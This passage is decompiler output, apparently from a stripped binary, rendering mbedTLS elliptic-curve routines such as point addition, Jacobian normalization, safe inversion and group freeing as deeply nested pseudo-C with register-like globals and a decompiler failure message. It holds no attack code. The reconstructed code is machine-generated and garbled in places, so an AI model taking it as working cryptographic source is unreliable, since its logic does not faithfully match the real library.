                        result3 = v21;
                    }
                } else {
                    result3 = v20;
                }
            } else {
                result3 = v19;
            }
        }
        // 0x805cd23
        g1 = mbedtls_mpi_free((int32_t *)g3);
        g1 = mbedtls_mpi_free(&v56);
        g1 = mbedtls_mpi_free(&v57);
        g1 = mbedtls_mpi_free(&v58);
        g1 = mbedtls_mpi_free(&v59);
        g1 = mbedtls_mpi_free(&v53);
        mbedtls_mpi_free(&v54);
        g1 = result3;
        // branch -> 0x805cd79
        // 0x805cd79
        g3 = v4;
        g7 = v3;
        g5 = v1;
        g2 = v8;
        return result3;
    }
    // 0x805ccbe
    v12 = &v55;
    g3 = v12;
    mbedtls_mpi_init(&v55);
    v13 = &v56;
    mbedtls_mpi_init(&v56);
    v14 = &v57;
    mbedtls_mpi_init(&v57);
    v15 = &v58;
    mbedtls_mpi_init(&v58);
    v16 = &v59;
    mbedtls_mpi_init(&v59);
    mbedtls_mpi_init(&v53);
    v17 = &v54;
    mbedtls_mpi_init(&v54);
    v67 = g7;
    v66 = g3;
    v64 = (int32_t *)v67;
    v18 = mbedtls_mpi_mul_mpi((int32_t *)v66, v64, v64);
    g1 = v18;
    result3 = v18;
    if (v18 == 0) {
        // 0x805cda8
        g6 = v6;
        g1 = v12;
        v19 = ecp_modp(v66, v67);
        g1 = v19;
        if (v19 == 0) {
            // 0x805cdbd
            g216++;
            v68 = g3;
            v20 = mbedtls_mpi_mul_mpi(&v56, (int32_t *)v68, (int32_t *)g7);
            g1 = v20;
            if (v20 == 0) {
                // 0x805cddf
                g6 = v6;
                g1 = v13;
                v21 = ecp_modp(v13, v68);
                g1 = v21;
                if (v21 == 0) {
                    // 0x805cdf5
                    g216++;
                    v69 = g3;
                    v65 = (int32_t *)v69;
                    v22 = mbedtls_mpi_mul_mpi(v65, v65, (int32_t *)a1);
                    g1 = v22;
                    if (v22 == 0) {
                        // 0x805ce17
                        g6 = v6;
                        g1 = v12;
                        v23 = ecp_modp(v69, v69);
                        g1 = v23;
                        if (v23 == 0) {
                            // 0x805ce2c
                            g216++;
                            v24 = mbedtls_mpi_mul_mpi(&v56, &v56, (int32_t *)(a1 + 12));
                            g1 = v24;
                            if (v24 == 0) {
                                // 0x805ce54
                                g6 = v6;
                                g1 = v13;
                                v25 = ecp_modp(v13, v13);
                                g1 = v25;
                                if (v25 == 0) {
                                    // 0x805ce6a
                                    g216++;
                                    v60 = (int32_t *)g3;
                                    v26 = mbedtls_mpi_sub_mpi(v60, v60, (int32_t *)g5);
                                    g1 = v26;
                                    if (v26 == 0) {
                                        // 0x805ce89
                                        v9 = v6 + 4;
                                        v61 = (int32_t *)v9;
                                        // branch -> 0x805cec6
                                        while (true) {
                                            // 0x805cec6
                                            if (v55 < 0) {
                                                goto lab_0x805ce97_2;
                                            }
                                            // 0x805cecc
                                            v62 = (int32_t *)(g5 + 12);
                                            v27 = mbedtls_mpi_sub_mpi(&v56, &v56, v62);
                                            g1 = v27;
                                            if (v27 == 0) {
                                                while (true) {
                                                    // 0x805cef0
                                                    if (v56 <= 0) {
                                                        goto lab_0x805cef6_2;
                                                    }
                                                    // 0x805cf72
                                                    if (mbedtls_mpi_cmp_int(g3, 0) == 0) {
                                                        // 0x805cf86
                                                        v28 = mbedtls_mpi_cmp_int(v13, 0);
                                                        g6 = v7;
                                                        if (v28 != 0) {
                                                            // 0x805d0e4
                                                            v39 = mbedtls_ecp_set_zero(v7);
                                                            g1 = v39;
                                                            result3 = v39;
                                                            // branch -> 0x805cd23
                                                            // 0x805cd23
                                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                                            g1 = mbedtls_mpi_free(&v56);
                                                            g1 = mbedtls_mpi_free(&v57);
                                                            g1 = mbedtls_mpi_free(&v58);
                                                            g1 = mbedtls_mpi_free(&v59);
                                                            g1 = mbedtls_mpi_free(&v53);
                                                            mbedtls_mpi_free(&v54);
                                                            g1 = result3;
                                                            // branch -> 0x805cd79
                                                            // 0x805cd79
                                                            g3 = v4;
                                                            g7 = v3;
                                                            g5 = v1;
                                                            g2 = v8;
                                                            return result3;
                                                        }
                                                        // 0x805cfa1
                                                        g4 = g5;
                                                        g1 = v6;
                                                        ecp_double_jac(v13, 0);
                                                        result3 = g1;
                                                        // branch -> 0x805cd23
                                                        // 0x805cd23
                                                        g1 = mbedtls_mpi_free((int32_t *)g3);
                                                        g1 = mbedtls_mpi_free(&v56);
                                                        g1 = mbedtls_mpi_free(&v57);
                                                        g1 = mbedtls_mpi_free(&v58);
                                                        g1 = mbedtls_mpi_free(&v59);
                                                        g1 = mbedtls_mpi_free(&v53);
                                                        mbedtls_mpi_free(&v54);
                                                        g1 = result3;
                                                        // branch -> 0x805cd79
                                                        // 0x805cd79
                                                        g3 = v4;
                                                        g7 = v3;
                                                        g5 = v1;
                                                        g2 = v8;
                                                        return result3;
                                                    }
                                                    // 0x805cfb6
                                                    v70 = g7;
                                                    v29 = mbedtls_mpi_mul_mpi(&v54, (int32_t *)v70, (int32_t *)g3);
                                                    g1 = v29;
                                                    if (v29 == 0) {
                                                        // 0x805cfd1
                                                        g6 = v6;
                                                        g1 = v17;
                                                        v30 = ecp_modp(v17, v70);
                                                        g1 = v30;
                                                        if (v30 == 0) {
                                                            // 0x805cfe7
                                                            g216++;
                                                            v71 = g3;
                                                            v63 = (int32_t *)v71;
                                                            v31 = mbedtls_mpi_mul_mpi(&v57, v63, v63);
                                                            g1 = v31;
                                                            if (v31 == 0) {
                                                                // 0x805d009
                                                                g6 = v6;
                                                                g1 = v14;
                                                                v32 = ecp_modp(v14, v71);
                                                                g1 = v32;
                                                                if (v32 == 0) {
                                                                    // 0x805d01f
                                                                    g216++;
                                                                    v33 = mbedtls_mpi_mul_mpi(&v58, &v57, (int32_t *)g3);
                                                                    g1 = v33;
                                                                    if (v33 == 0) {
                                                                        // 0x805d044
                                                                        g6 = v6;
                                                                        g1 = v15;
                                                                        v34 = ecp_modp(v15, v14);
                                                                        g1 = v34;
                                                                        if (v34 == 0) {
                                                                            // 0x805d05a
                                                                            g216++;
                                                                            v35 = mbedtls_mpi_mul_mpi(&v57, &v57, (int32_t *)g5);
                                                                            g1 = v35;
                                                                            if (v35 == 0) {
                                                                                // 0x805d07c
                                                                                g6 = v6;
                                                                                g1 = v14;
                                                                                v36 = ecp_modp(v14, v14);
                                                                                g1 = v36;
                                                                                if (v36 == 0) {
                                                                                    // 0x805d092
                                                                                    g216++;
                                                                                    v37 = mbedtls_mpi_mul_int(g3, v14, 2);
                                                                                    g1 = v37;
                                                                                    if (v37 == 0) {
                                                                                        // 0x805d0b8
                                                                                        g7 = v9;
                                                                                        if (mbedtls_mpi_cmp_mpi((int32_t *)g3, v61) < 0) {
                                                                                            // 0x805d0f5
                                                                                            v40 = mbedtls_mpi_mul_mpi(&v59, &v56, &v56);
                                                                                            g1 = v40;
                                                                                            if (v40 == 0) {
                                                                                                // 0x805d113
                                                                                                g6 = v6;
                                                                                                g1 = v16;
                                                                                                v41 = ecp_modp(v16, v13);
                                                                                                g1 = v41;
                                                                                                if (v41 == 0) {
                                                                                                    // 0x805d129
                                                                                                    g216++;
                                                                                                    v42 = mbedtls_mpi_sub_mpi(&v59, &v59, (int32_t *)g3);
                                                                                                    g1 = v42;
                                                                                                    if (v42 == 0) {
                                                                                                        while (true) {
                                                                                                            // 0x805d14b
                                                                                                            if (v59 <= 0) {
                                                                                                                goto lab_0x805d151_3;
                                                                                                            }
                                                                                                            // 0x805d187
                                                                                                            v43 = mbedtls_mpi_sub_mpi(&v59, &v59, &v58);
                                                                                                            g1 = v43;
                                                                                                            if (v43 == 0) {
                                                                                                                while (true) {
                                                                                                                    // 0x805d1a5
                                                                                                                    if (v59 <= 0) {
                                                                                                                        goto lab_0x805d1ab_3;
                                                                                                                    }
                                                                                                                    // 0x805d1e1
                                                                                                                    v44 = mbedtls_mpi_sub_mpi(&v57, &v57, &v59);
                                                                                                                    g1 = v44;
                                                                                                                    if (v44 == 0) {
                                                                                                                        while (true) {
                                                                                                                            // 0x805d1ff
                                                                                                                            if (v57 <= 0) {
                                                                                                                                goto lab_0x805d205_3;
                                                                                                                            }
                                                                                                                            // 0x805d23b
                                                                                                                            v45 = mbedtls_mpi_mul_mpi(&v57, &v57, &v56);
                                                                                                                            g1 = v45;
                                                                                                                            if (v45 == 0) {
                                                                                                                                // 0x805d259
                                                                                                                                g6 = v6;
                                                                                                                                g1 = v14;
                                                                                                                                v46 = ecp_modp(v14, v14);
                                                                                                                                g1 = v46;
                                                                                                                                if (v46 == 0) {
                                                                                                                                    // 0x805d26f
                                                                                                                                    g216++;
                                                                                                                                    v47 = mbedtls_mpi_mul_mpi(&v58, &v58, v62);
                                                                                                                                    g1 = v47;
                                                                                                                                    if (v47 == 0) {
                                                                                                                                        // 0x805d297
                                                                                                                                        g6 = v6;
                                                                                                                                        g1 = v15;
                                                                                                                                        v48 = ecp_modp(v15, v15);
                                                                                                                                        g1 = v48;
                                                                                                                                        if (v48 == 0) {
                                                                                                                                            // 0x805d2ad
                                                                                                                                            g216++;
                                                                                                                                            v49 = mbedtls_mpi_sub_mpi(&v53, &v57, &v58);
                                                                                                                                            g1 = v49;
                                                                                                                                            if (v49 == 0) {
                                                                                                                                                while (true) {
                                                                                                                                                    // 0x805d2d5
                                                                                                                                                    if (v53 <= 0) {
                                                                                                                                                        goto lab_0x805d2db_3;
                                                                                                                                                    }
                                                                                                                                                    // 0x805d311
                                                                                                                                                    g1 = v7;
                                                                                                                                                    v50 = mbedtls_mpi_copy((char *)v7, &v59);
                                                                                                                                                    g1 = v50;
                                                                                                                                                    if (v50 == 0) {
                                                                                                                                                        // 0x805d32b
                                                                                                                                                        v10 = v7 + 12;
                                                                                                                                                        g1 = v10;
                                                                                                                                                        v51 = mbedtls_mpi_copy((char *)v10, &v53);
                                                                                                                                                        g1 = v51;
                                                                                                                                                        if (v51 == 0) {
                                                                                                                                                            // 0x805d348
                                                                                                                                                            v11 = v7 + 24;
                                                                                                                                                            g1 = v11;
                                                                                                                                                            v52 = mbedtls_mpi_copy((char *)v11, &v54);
                                                                                                                                                            g1 = v52;
                                                                                                                                                            result3 = v52;
                                                                                                                                                            // branch -> 0x805cd23
                                                                                                                                                            // 0x805cd23
                                                                                                                                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                                                            g1 = mbedtls_mpi_free(&v56);
                                                                                                                                                            g1 = mbedtls_mpi_free(&v57);
                                                                                                                                                            g1 = mbedtls_mpi_free(&v58);
                                                                                                                                                            g1 = mbedtls_mpi_free(&v59);
                                                                                                                                                            g1 = mbedtls_mpi_free(&v53);
                                                                                                                                                            mbedtls_mpi_free(&v54);
                                                                                                                                                            g1 = result3;
                                                                                                                                                            // branch -> 0x805cd79
                                                                                                                                                            // 0x805cd79
                                                                                                                                                            g3 = v4;
                                                                                                                                                            g7 = v3;
                                                                                                                                                            g5 = v1;
                                                                                                                                                            g2 = v8;
                                                                                                                                                            return result3;
                                                                                                                                                        }
                                                                                                                                                        result3 = v51;
                                                                                                                                                    } else {
                                                                                                                                                        result3 = v50;
                                                                                                                                                    }
                                                                                                                                                }
                                                                                                                                            } else {
                                                                                                                                                result3 = v49;
                                                                                                                                            }
                                                                                                                                        } else {
                                                                                                                                            result3 = v48;
                                                                                                                                        }
                                                                                                                                    } else {
                                                                                                                                        result3 = v47;
                                                                                                                                    }
                                                                                                                                } else {
                                                                                                                                    result3 = v46;
                                                                                                                                }
                                                                                                                            } else {
                                                                                                                                result3 = v45;
                                                                                                                            }
                                                                                                                        }
                                                                                                                    } else {
                                                                                                                        result3 = v44;
                                                                                                                    }
                                                                                                                }
                                                                                                            } else {
                                                                                                                result3 = v43;
                                                                                                            }
                                                                                                        }
                                                                                                    } else {
                                                                                                        result3 = v42;
                                                                                                    }
                                                                                                } else {
                                                                                                    result3 = v41;
                                                                                                }
                                                                                            } else {
                                                                                                result3 = v40;
                                                                                            }
                                                                                        } else {
                                                                                            while (true) {
                                                                                                // 0x805d0cb
                                                                                                v72 = g3;
                                                                                                v38 = mbedtls_mpi_sub_abs((int32_t *)v72, v72, g7);
                                                                                                g1 = v38;
                                                                                                if (v38 == 0) {
                                                                                                    goto lab_0x805d0cb_2;
                                                                                                }
                                                                                                result3 = v38;
                                                                                                // 0x805cd23
                                                                                                g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                g1 = mbedtls_mpi_free(&v56);
                                                                                                g1 = mbedtls_mpi_free(&v57);
                                                                                                g1 = mbedtls_mpi_free(&v58);
                                                                                                g1 = mbedtls_mpi_free(&v59);
                                                                                                g1 = mbedtls_mpi_free(&v53);
                                                                                                mbedtls_mpi_free(&v54);
                                                                                                g1 = result3;
                                                                                                // branch -> 0x805cd79
                                                                                                // 0x805cd79
                                                                                                g3 = v4;
                                                                                                g7 = v3;
                                                                                                g5 = v1;
                                                                                                g2 = v8;
                                                                                                return result3;
                                                                                            }
                                                                                        }
                                                                                        // 0x805cd23
                                                                                        g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                        g1 = mbedtls_mpi_free(&v56);
                                                                                        g1 = mbedtls_mpi_free(&v57);
                                                                                        g1 = mbedtls_mpi_free(&v58);
                                                                                        g1 = mbedtls_mpi_free(&v59);
                                                                                        g1 = mbedtls_mpi_free(&v53);
                                                                                        mbedtls_mpi_free(&v54);
                                                                                        g1 = result3;
                                                                                        // branch -> 0x805cd79
                                                                                        // 0x805cd79
                                                                                        g3 = v4;
                                                                                        g7 = v3;
                                                                                        g5 = v1;
                                                                                        g2 = v8;
                                                                                        return result3;
                                                                                    }
                                                                                    result3 = v37;
                                                                                } else {
                                                                                    result3 = v36;
                                                                                }
                                                                            } else {
                                                                                result3 = v35;
                                                                            }
                                                                        } else {
                                                                            result3 = v34;
                                                                        }
                                                                    } else {
                                                                        result3 = v33;
                                                                    }
                                                                } else {
                                                                    result3 = v32;
                                                                }
                                                            } else {
                                                                result3 = v31;
                                                            }
                                                        } else {
                                                            result3 = v30;
                                                        }
                                                    } else {
                                                        result3 = v29;
                                                    }
                                                    // 0x805cd23
                                                    g1 = mbedtls_mpi_free((int32_t *)g3);
                                                    g1 = mbedtls_mpi_free(&v56);
                                                    g1 = mbedtls_mpi_free(&v57);
                                                    g1 = mbedtls_mpi_free(&v58);
                                                    g1 = mbedtls_mpi_free(&v59);
                                                    g1 = mbedtls_mpi_free(&v53);
                                                    mbedtls_mpi_free(&v54);
                                                    g1 = result3;
                                                    // branch -> 0x805cd79
                                                    // 0x805cd79
                                                    g3 = v4;
                                                    g7 = v3;
                                                    g5 = v1;
                                                    g2 = v8;
                                                    return result3;
                                                }
                                            } else {
                                                result3 = v27;
                                            }
                                        }
                                    } else {
                                        result3 = v26;
                                    }
                                } else {
                                    result3 = v25;
                                }
                            } else {
                                result3 = v24;
                            }
                        } else {
                            result3 = v23;
                        }
                    } else {
                        result3 = v22;
                    }
                } else {
                    result3 = v21;
                }
            } else {
                result3 = v20;
            }
        } else {
            result3 = v19;
        }
    }
    // 0x805cd23
    g1 = mbedtls_mpi_free((int32_t *)g3);
    g1 = mbedtls_mpi_free(&v56);
    g1 = mbedtls_mpi_free(&v57);
    g1 = mbedtls_mpi_free(&v58);
    g1 = mbedtls_mpi_free(&v59);
    g1 = mbedtls_mpi_free(&v53);
    mbedtls_mpi_free(&v54);
    g1 = result3;
    // branch -> 0x805cd79
    // Detected a possible infinite recursion (goto support failed); quitting...
}

// Address range: 0x805d370 - 0x805d4df
int32_t ecp_normalize_jac(int32_t a1, int32_t a2) {
    int32_t v1 = g3; // 0x805d376
    int32_t v2 = g6; // 0x805d379
    int32_t v3 = v2 + 24; // 0x805d379
    g3 = v3;
    int32_t v4 = g7; // 0x805d37c
    g7 = v2;
    int32_t v5 = g1; // 0x805d384
    if (mbedtls_mpi_cmp_int(v3, 0) == 0) {
        // 0x805d39f
        g3 = v1;
        g7 = v4;
        return 0;
    }
    // 0x805d3b0
    int32_t v6;
    g5 = &v6;
    mbedtls_mpi_init(&v6);
    int32_t v7;
    int32_t v8 = &v7; // 0x805d3bb_0
    mbedtls_mpi_init(&v7);
    int32_t v9 = mbedtls_mpi_inv_mod(g5, g3, v5 + 4); // 0x805d3d7
    g1 = v9;
    int32_t result = v9; // 0x805d3e0
    if (v9 == 0) {
        int32_t v10 = g5; // 0x805d40b
        int32_t * v11 = (int32_t *)v10;
        int32_t v12 = mbedtls_mpi_mul_mpi(&v7, v11, v11); // 0x805d416
        g1 = v12;
        if (v12 == 0) {
            // 0x805d41f
            g6 = v5;
            g1 = v8;
            int32_t v13 = ecp_modp(v8, v10); // 0x805d425
            g1 = v13;
            if (v13 == 0) {
                // 0x805d42e
                g216++;
                int32_t v14 = g7; // 0x805d43c
                int32_t * v15 = (int32_t *)v14;
                int32_t v16 = mbedtls_mpi_mul_mpi(v15, v15, &v7); // 0x805d443
                g1 = v16;
                if (v16 == 0) {
                    // 0x805d44c
                    g6 = v5;
                    g1 = g7;
                    int32_t v17 = ecp_modp(v14, v14); // 0x805d451
                    g1 = v17;
                    if (v17 == 0) {
                        int32_t v18 = g7 + 12; // 0x805d45a
                        g7 = v18;
                        g216++;
                        int32_t * v19 = (int32_t *)v18;
                        int32_t v20 = mbedtls_mpi_mul_mpi(v19, v19, &v7); // 0x805d472
                        g1 = v20;
                        if (v20 == 0) {
                            // 0x805d47f
                            g6 = v5;
                            g1 = g7;
                            int32_t v21 = ecp_modp(v18, v18); // 0x805d484
                            g1 = v21;
                            if (v21 == 0) {
                                // 0x805d491
                                g216++;
                                int32_t v22 = g7; // 0x805d49c
                                int32_t * v23 = (int32_t *)v22;
                                int32_t v24 = mbedtls_mpi_mul_mpi(v23, v23, (int32_t *)g5); // 0x805d4a3
                                g1 = v24;
                                if (v24 == 0) {
                                    // 0x805d4b0
                                    g6 = v5;
                                    g1 = g7;
                                    int32_t v25 = ecp_modp(v22, v22); // 0x805d4b5
                                    g1 = v25;
                                    if (v25 == 0) {
                                        // 0x805d4c2
                                        g216++;
                                        int32_t v26 = mbedtls_mpi_lset((char *)g3, 1); // 0x805d4d4
                                        g1 = v26;
                                        result = v26;
                                        // branch -> 0x805d3e0
                                    } else {
                                        result = v25;
                                    }
                                } else {
                                    result = v24;
                                }
                            } else {
                                result = v21;
                            }
                        } else {
                            result = v20;
                        }
                    } else {
                        result = v17;
                    }
                } else {
                    result = v16;
                }
            } else {
                result = v13;
            }
        } else {
            result = v12;
        }
    }
    // 0x805d3e0
    g1 = mbedtls_mpi_free((int32_t *)g5);
    mbedtls_mpi_free(&v7);
    g3 = v1;
    g7 = v4;
    return result;
}

// Address range: 0x805d4e0 - 0x805d560
int32_t ecp_safe_invert_jac(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x805d4e6
    int32_t v2 = g5; // 0x805d4eb
    int32_t v3 = g1 + 4; // 0x805d4f0
    g3 = v3;
    int32_t v4 = g7; // 0x805d4f3
    g5 = g6 + 12;
    int32_t v5;
    g7 = &v5;
    mbedtls_mpi_init(&v5);
    int32_t v6 = mbedtls_mpi_sub_mpi((int32_t *)g7, (int32_t *)v3, (int32_t *)g5); // 0x805d512
    g1 = v6;
    g3 = v6;
    if (v6 == 0) {
        int32_t v7 = mbedtls_mpi_cmp_int(g5, 0); // 0x805d528
        int32_t v8 = mbedtls_mpi_safe_cond_assign((int32_t *)g5, (int32_t *)g7, g4 % 2 & (((int32_t)(v7 == 0) | v7 & -256) ^ 1)); // 0x805d543
        g1 = v8;
        g3 = v8;
        // branch -> 0x805d54a
    }
    // 0x805d54a
    mbedtls_mpi_free((int32_t *)g7);
    int32_t result = g3; // 0x805d552
    g1 = result;
    g7 = v4;
    g3 = v1;
    g5 = v2;
    int32_t v9;
    g2 = v9;
    return result;
}

// Address range: 0x805d561 - 0x805d56f
int32_t function_805d561(void) {
    int32_t result = ecp_select_comb(0, 0, 0, 0, 0, 0, 0, 0, 0, 0); // 0x805d561
    g1 = result;
    return result;
}

// Address range: 0x805d570 - 0x805d629
int32_t ecp_select_comb(uint32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10) {
    int32_t v1 = g5; // 0x805d573
    int32_t v2 = g7; // 0x805d574
    int32_t v3 = g3; // 0x805d575
    int32_t v4 = g6; // 0x805d580
    if (a1 % 256 != 0) {
        int32_t v5 = g4; // 0x805d59d
        g3 = v5;
        g7 = 0;
        int32_t v6 = a2 / 2 % 64 == 0; // 0x805d5e0
        g5 = v6;
        return mbedtls_mpi_safe_cond_assign((int32_t *)v4, (int32_t *)v5, v6);
    }
    // 0x805d608
    g6 = v4;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    g4 = a2 / 128 % 2;
    int32_t v7;
    int32_t v8;
    return ecp_safe_invert_jac(v8, v7, a1);
}

// Address range: 0x805d62a - 0x805d62f
int32_t function_805d62a(int32_t a1) {
    // 0x805d62a
    return g5;
}

// Address range: 0x805d630 - 0x805d6df
int32_t mbedtls_ecp_group_free(char * a1) {
    int32_t v1 = g3; // 0x805d635
    int32_t v2 = (int32_t)a1;
    int32_t result; // 0x805d6d1_2
    if (a1 == NULL) {
        // 0x805d630
        result = g1;
        // branch -> 0x805d6ca
    } else {
        int32_t v3 = v2; // 0x805d688
        if (*(int32_t *)(v2 + 96) != 1) {
            int32_t v4 = v2 + 4; // 0x805d64a
            g1 = v4;
            mbedtls_mpi_free((int32_t *)v4);
            int32_t v5 = v2 + 16; // 0x805d655
            g1 = v5;
            mbedtls_mpi_free((int32_t *)v5);
            int32_t v6 = v2 + 28; // 0x805d660
            g1 = v6;
            mbedtls_mpi_free((int32_t *)v6);
            int32_t v7 = v2 + 40; // 0x805d66b
            g1 = v7;
            mbedtls_ecp_point_free(v7);
            int32_t v8 = v2 + 76; // 0x805d676
            g1 = v8;
            mbedtls_mpi_free((int32_t *)v8);
            v3 = v2;
            // branch -> 0x805d681
        }
        int32_t v9 = *(int32_t *)(v3 + 116); // 0x805d681
        int32_t v10 = v3; // 0x805d6bb
        if (v9 != 0) {
            if (*(int32_t *)(v3 + 120) != 0) {
                int32_t v11 = 0; // 0x805d69d
                int32_t v12 = 0; // 0x805d6a3
                // branch -> 0x805d69b
                while (true) {
                    int32_t v13 = v9 + v12; // 0x805d69b
                    g1 = v13;
                    g3 = v11 + 1;
                    mbedtls_ecp_point_free(v13);
                    int32_t v14 = g3; // 0x805d6ab
                    int32_t v15 = *(int32_t *)(v2 + 116); // 0x805d698
                    if (*(int32_t *)(v2 + 120) > v14) {
                        // 0x805d69b
                        v11 = v14;
                        v12 += 36;
                        v9 = v15;
                        // branch -> 0x805d69b
                        continue;
                    } else {
                        v9 = v15;
                    }
                }
            }
            // 0x805d6b3
            free((char *)v9);
            v10 = v2;
            // branch -> 0x805d6bb
        }
        // 0x805d6bb
        g6 = v10 + 124;
        *(char *)v10 = 0;
        int32_t v16 = v10 + 1; // 0x805d6c3
        // branch -> 0x805d6c0
        while (v16 != g6) {
            // 0x805d6c0
            *(char *)v16 = 0;
            v16++;
            // continue -> 0x805d6c0
        }
        // 0x805d6ca
        result = v16;
        // branch -> 0x805d6ca
    }
    // 0x805d6ca
    g3 = v1;
    int32_t v17;
    g2 = v17;
    return result;
}

// Address range: 0x805d6e0 - 0x805d71f
int32_t mbedtls_ecp_keypair_free(int32_t a1) {
    int32_t v1 = g3; // 0x805d6e3
    g3 = a1;
    int32_t result; // 0x805d70f
    int32_t v2;
    if (a1 != 0) {
        // 0x805d6ee
        mbedtls_ecp_group_free((char *)a1);
        int32_t v3 = g3; // 0x805d6f6
        int32_t v4 = v3 + 124; // 0x805d6f6
        g1 = v4;
        g3 = v3 + 136;
        g1 = mbedtls_mpi_free((int32_t *)v4);
        g3 = v1;
        result = mbedtls_ecp_point_free(v2);
        g1 = result;
        // branch -> 0x805d718
    }
    // 0x805d718
    g3 = v1;
    g2 = v2;
    return result;
}

// Address range: 0x805d720 - 0x805da9f
char * ecp_normalize_jac_many(int32_t a1, int32_t a2, int32_t a3) {
    int32_t nmemb = g4; // 0x805d726
    int32_t v1 = g6; // 0x805d72c
    g3 = v1;
    g7 = nmemb;
    g5 = g1;
    if (nmemb <= 1) {
        // 0x805d73a
        g6 = *(int32_t *)v1;
        // branch -> 0x805d741
        // 0x805d741
        int32_t v2;
        int32_t v3;
        return (char *)ecp_normalize_jac((int32_t)(char *)v3, v2);
    }
    char * mem = calloc(nmemb, 12); // 0x805d75b
    int32_t v4 = (int32_t)mem; // 0x805d75b_5
    if (mem != NULL) {
        // 0x805d76f
        int32_t v5;
        int32_t v6 = &v5; // 0x805d76f_0
        mbedtls_mpi_init(&v5);
        int32_t v7;
        int32_t v8 = &v7; // 0x805d77a_0
        mbedtls_mpi_init(&v7);
        int32_t v9;
        mbedtls_mpi_init(&v9);
        g1 = v4;
        int32_t v10 = mbedtls_mpi_copy(mem, (int32_t *)(*(int32_t *)g3 + 24)); // 0x805d79f
        g1 = v10;
        int32_t v11 = v10; // 0x805da38
        int32_t v12; // 0x805da6b
        int32_t v13; // 0x805da76
        if (v10 == 0) {
            int32_t v14 = g5; // 0x805d7b4
            int32_t v15 = g3; // 0x805d7b7
            g5 = v15;
            int32_t v16 = g7; // 0x805d7b9
            g7 = 1;
            int32_t v17 = v4; // 0x805d7c3
            int32_t v18 = 1; // 0x805d7c0
            // branch -> 0x805d7c0
            while (true) {
                int32_t v19 = *(int32_t *)(4 * v18 + v15); // 0x805d7c0
                int32_t v20 = v17 + 12; // 0x805d7c5
                g3 = v20;
                char * v21 = (char *)v20; // bp-108
                int32_t v22 = mbedtls_mpi_mul_mpi((int32_t *)v20, (int32_t *)v17, (int32_t *)(v19 + 24)); // 0x805d7d6
                g1 = v22;
                if (v22 == 0) {
                    // 0x805d7e3
                    g6 = v14;
                    g1 = g3;
                    int32_t v23 = ecp_modp((int32_t)v21, v17); // 0x805d7e8
                    g1 = v23;
                    if (v23 == 0) {
                        // 0x805d7f5
                        g216++;
                        int32_t v24 = g7 + 1; // 0x805d7fc
                        g7 = v24;
                        if (v16 > v24) {
                            // 0x805d7f5
                            v17 = g3;
                            v18 = v24;
                            v15 = g5;
                            // branch -> 0x805d7c0
                            continue;
                        } else {
                            // 0x805d804
                            g7 = v16;
                            g3 = g5;
                            g5 = v14;
                            int32_t v25 = v16 - 1; // 0x805d80f
                            int32_t v26 = mbedtls_mpi_inv_mod(v6, 12 * v25 + v4, v14 + 4); // 0x805d82c
                            g1 = v26;
                            v11 = v26;
                            if (v26 == 0) {
                                int32_t v27 = g7; // 0x805d83f
                                g7 = v25;
                                char * v28 = (char *)(v4 - 24 + 12 * v27);
                                int32_t v29; // 0x805d9ce
                                int32_t v30; // 0x805da1a
                                char * v31;
                                if (v25 == 0) {
                                    char * v32 = v28;
                                  lab_0x805d856:
                                    // 0x805d856
                                    g1 = v6;
                                    int32_t v33 = mbedtls_mpi_copy((char *)&v7, &v5); // 0x805d863
                                    g1 = v33;
                                    if (v33 == 0) {
                                        char * v34 = v32;
                                      lab_0x805d870:;
                                        int32_t v35 = mbedtls_mpi_mul_mpi(&v9, &v7, &v7); // 0x805d881
                                        g1 = v35;
                                        if (v35 == 0) {
                                            // 0x805d88e
                                            g6 = g5;
                                            g1 = &v9;
                                            int32_t v36 = ecp_modp((int32_t)(char *)&v9, v8); // 0x805d893
                                            g1 = v36;
                                            if (v36 == 0) {
                                                int32_t v37 = *(int32_t *)(4 * g7 + g3); // 0x805d8a0
                                                g216++;
                                                int32_t * v38 = (int32_t *)v37;
                                                int32_t v39 = mbedtls_mpi_mul_mpi(v38, v38, &v9); // 0x805d8b8
                                                g1 = v39;
                                                if (v39 == 0) {
                                                    // 0x805d8c5
                                                    g1 = *(int32_t *)(4 * g7 + g3);
                                                    g6 = g5;
                                                    int32_t v40 = ecp_modp((int32_t)(char *)v37, v37); // 0x805d8ca
                                                    g1 = v40;
                                                    if (v40 == 0) {
                                                        // 0x805d8d7
                                                        g216++;
                                                        int32_t v41 = *(int32_t *)(4 * g7 + g3) + 12; // 0x805d8e8
                                                        int32_t * v42 = (int32_t *)v41;
                                                        int32_t v43 = mbedtls_mpi_mul_mpi(v42, v42, &v9); // 0x805d8f2
                                                        g1 = v43;
                                                        if (v43 == 0) {
                                                            // 0x805d8ff
                                                            g6 = g5;
                                                            g1 = *(int32_t *)(4 * g7 + g3) + 12;
                                                            int32_t v44 = ecp_modp((int32_t)(char *)v41, v41); // 0x805d907
                                                            g1 = v44;
                                                            if (v44 == 0) {
                                                                // 0x805d914
                                                                g216++;
                                                                int32_t v45 = *(int32_t *)(4 * g7 + g3) + 12; // 0x805d925
                                                                int32_t * v46 = (int32_t *)v45;
                                                                int32_t v47 = mbedtls_mpi_mul_mpi(v46, v46, &v7); // 0x805d92f
                                                                g1 = v47;
                                                                if (v47 == 0) {
                                                                    // 0x805d93c
                                                                    g6 = g5;
                                                                    g1 = *(int32_t *)(4 * g7 + g3) + 12;
                                                                    int32_t v48 = ecp_modp((int32_t)(char *)v45, v45); // 0x805d944
                                                                    g1 = v48;
                                                                    if (v48 == 0) {
                                                                        // 0x805d951
                                                                        g216++;
                                                                        int32_t v49 = *(int32_t *)(4 * g7 + g3); // 0x805d95f
                                                                        int32_t v50 = mbedtls_mpi_shrink(v49, (char *)*(int32_t *)(g5 + 8)); // 0x805d965
                                                                        g1 = v50;
                                                                        if (v50 == 0) {
                                                                            int32_t v51 = *(int32_t *)(4 * g7 + g3); // 0x805d979
                                                                            int32_t v52 = mbedtls_mpi_shrink(v51 + 12, (char *)*(int32_t *)(g5 + 8)); // 0x805d982
                                                                            g1 = v52;
                                                                            if (v52 == 0) {
                                                                                // 0x805d98f
